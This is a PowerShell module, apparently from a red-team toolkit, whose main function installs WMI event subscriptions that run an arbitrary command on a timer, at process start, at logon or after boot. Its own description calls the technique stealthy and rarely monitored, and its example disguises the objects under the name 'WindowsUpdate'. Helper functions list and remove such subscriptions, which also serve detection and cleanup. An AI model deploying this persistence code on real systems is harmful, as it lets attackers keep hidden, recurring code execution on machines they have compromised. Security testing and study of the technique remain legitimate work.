<#
.SYNOPSIS
    Establish persistence via WMI Event Subscriptions

.DESCRIPTION
    Creates WMI event subscriptions that execute commands based on system events.
    This is a stealthy persistence mechanism rarely monitored by security tools.

    Components:
    - Event Filter: Defines what event to watch for
    - Event Consumer: Defines what action to take
    - Binding: Connects filter to consumer

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER Name
    Base name for the WMI objects

.PARAMETER Command
    Command to execute

.PARAMETER TriggerType
    Type of event trigger

.PARAMETER IntervalSeconds
    Interval for periodic execution

.EXAMPLE
    Invoke-WMIEventPersistence -Name "WindowsUpdate" -Command "powershell.exe -Command ..." -TriggerType ProcessStart -ProcessName "explorer.exe"
    Invoke-WMIEventPersistence -Name "WindowsUpdate" -Remove
#>

function Invoke-WMIEventPersistence {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Name,

        [Parameter(ParameterSetName = 'Add')]
        [string]$Command,

        [Parameter(ParameterSetName = 'Add')]
        [ValidateSet('Interval', 'ProcessStart', 'UserLogon', 'Startup')]
        [string]$TriggerType = 'Interval',

        [Parameter(ParameterSetName = 'Add')]
        [int]$IntervalSeconds = 300,

        [Parameter(ParameterSetName = 'Add')]
        [string]$ProcessName = 'explorer.exe',

        [Parameter(ParameterSetName = 'Remove')]
        [switch]$Remove
    )

    # Check for admin privileges
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Error "Administrator privileges required for WMI event subscriptions"
        return
    }

    $filterName = "${Name}Filter"
    $consumerName = "${Name}Consumer"

    if ($Remove) {
        Write-Host "[*] Removing WMI persistence: $Name" -ForegroundColor Yellow

        try {
            # Remove binding first
            Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -match $filterName } |
            Remove-WmiObject

            # Remove consumer
            Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $consumerName } |
            Remove-WmiObject

            # Remove filter
            Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $filterName } |
            Remove-WmiObject

            Write-Host "[+] WMI persistence removed" -ForegroundColor Green
        }
        catch {
            Write-Error "Failed to remove WMI persistence: $_"
        }
        return
    }

    if (-not $Command) {
        Write-Error "Command is required when adding persistence"
        return
    }

    Write-Host @"

============================================================
  WMI EVENT SUBSCRIPTION PERSISTENCE
============================================================
  Name: $Name
  Trigger: $TriggerType
  Command: $Command
============================================================

"@ -ForegroundColor Cyan

    # Build WQL query based on trigger type
    $query = switch ($TriggerType) {
        'Interval' {
            # Fires periodically based on system performance data changes
            "SELECT * FROM __InstanceModificationEvent WITHIN $IntervalSeconds WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
        'ProcessStart' {
            # Fires when specific process starts
            "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '$ProcessName'"
        }
        'UserLogon' {
            # Fires on user logon
            "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
        }
        'Startup' {
            # Fires shortly after system startup
            "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 1"
        }
    }

    try {
        # Step 1: Create Event Filter
        Write-Host "[*] Creating event filter..." -ForegroundColor Yellow

        $filterArgs = @{
            Name             = $filterName
            EventNamespace   = "root\cimv2"
            QueryLanguage    = "WQL"
            Query            = $query
        }

        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

        if (-not $filter) {
            throw "Failed to create event filter"
        }
        Write-Host "[+] Event filter created" -ForegroundColor Green

        # Step 2: Create Event Consumer
        Write-Host "[*] Creating event consumer..." -ForegroundColor Yellow

        $consumerArgs = @{
            Name                = $consumerName
            CommandLineTemplate = $Command
        }

        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

        if (-not $consumer) {
            throw "Failed to create event consumer"
        }
        Write-Host "[+] Event consumer created" -ForegroundColor Green

        # Step 3: Create Binding
        Write-Host "[*] Creating binding..." -ForegroundColor Yellow

        $bindingArgs = @{
            Filter   = $filter
            Consumer = $consumer
        }

        $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs

        if (-not $binding) {
            throw "Failed to create binding"
        }
        Write-Host "[+] Binding created" -ForegroundColor Green

        Write-Host @"

[+] WMI PERSISTENCE ESTABLISHED

[*] COMPONENTS:
    Filter: $filterName
    Consumer: $consumerName
    Query: $query

[*] VERIFICATION:
    Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { `$_.Name -eq "$filterName" }
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { `$_.Name -eq "$consumerName" }

[*] REMOVAL:
    Invoke-WMIEventPersistence -Name "$Name" -Remove
"@ -ForegroundColor Cyan

    }
    catch {
        Write-Error "Failed to create WMI persistence: $_"

        # Cleanup on failure
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
        Where-Object { $_.Name -eq $consumerName } |
        Remove-WmiObject -ErrorAction SilentlyContinue

        Get-WmiObject -Namespace root\subscription -Class __EventFilter |
        Where-Object { $_.Name -eq $filterName } |
        Remove-WmiObject -ErrorAction SilentlyContinue
    }
}

function Get-WMIEventSubscriptions {
    <#
    .SYNOPSIS
        List all WMI event subscriptions (potential persistence)

    .EXAMPLE
        Get-WMIEventSubscriptions
    #>
    [CmdletBinding()]
    param()

    Write-Host "[*] Enumerating WMI event subscriptions..." -ForegroundColor Yellow

    $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
    $consumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue
    $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue

    Write-Host "`n=== EVENT FILTERS ===" -ForegroundColor Cyan
    if ($filters) {
        $filters | ForEach-Object {
            Write-Host "  Name: $($_.Name)" -ForegroundColor Yellow
            Write-Host "  Query: $($_.Query)" -ForegroundColor Gray
            Write-Host ""
        }
    }
    else {
        Write-Host "  None found" -ForegroundColor Gray
    }

    Write-Host "=== COMMAND LINE CONSUMERS ===" -ForegroundColor Cyan
    if ($consumers) {
        $consumers | ForEach-Object {
            Write-Host "  Name: $($_.Name)" -ForegroundColor Yellow
            Write-Host "  Command: $($_.CommandLineTemplate)" -ForegroundColor Red
            Write-Host ""
        }
    }
    else {
        Write-Host "  None found" -ForegroundColor Gray
    }

    Write-Host "=== BINDINGS ===" -ForegroundColor Cyan
    if ($bindings) {
        $bindings | ForEach-Object {
            Write-Host "  Filter: $($_.Filter)" -ForegroundColor Yellow
            Write-Host "  Consumer: $($_.Consumer)" -ForegroundColor Yellow
            Write-Host ""
        }
    }
    else {
        Write-Host "  None found" -ForegroundColor Gray
    }

    return @{
        Filters   = $filters
        Consumers = $consumers
        Bindings  = $bindings
    }
}

function Remove-AllWMIPersistence {
    <#
    .SYNOPSIS
        Remove all WMI event subscriptions (use with caution)

    .EXAMPLE
        Remove-AllWMIPersistence -Confirm
    #>
    [CmdletBinding()]
    param(
        [switch]$Confirm
    )

    if (-not $Confirm) {
        Write-Warning "This will remove ALL WMI event subscriptions. Use -Confirm to proceed."
        return
    }

    Write-Host "[*] Removing all WMI event subscriptions..." -ForegroundColor Yellow

    # Remove bindings
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Remove-WmiObject

    # Remove consumers
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Remove-WmiObject

    # Remove filters
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
    Remove-WmiObject

    Write-Host "[+] All WMI subscriptions removed" -ForegroundColor Green
}

# Export functions
Export-ModuleMember -Function Invoke-WMIEventPersistence, Get-WMIEventSubscriptions, Remove-AllWMIPersistence
